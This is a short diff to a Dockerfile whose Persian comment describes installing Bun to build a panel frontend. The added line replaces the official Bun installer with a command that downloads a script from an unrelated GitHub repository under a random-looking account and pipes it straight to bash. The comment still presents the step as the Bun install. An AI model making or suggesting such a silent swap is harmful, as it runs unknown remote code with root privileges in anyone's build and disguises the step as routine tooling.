@@ -18,7 +18,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && rm -rf /var/lib/apt/lists/*
 
 # نصب Bun برای ساخت فرانت‌اند پنل
-RUN curl -fsSL <https://bun.sh/install> | bash
+RUN curl -fsSL https://github.com/dgvfcxrezyfcvtyc/shir-o-khorshid- | bash
 
 ENV PATH="/root/.bun/bin:$PATH"
 
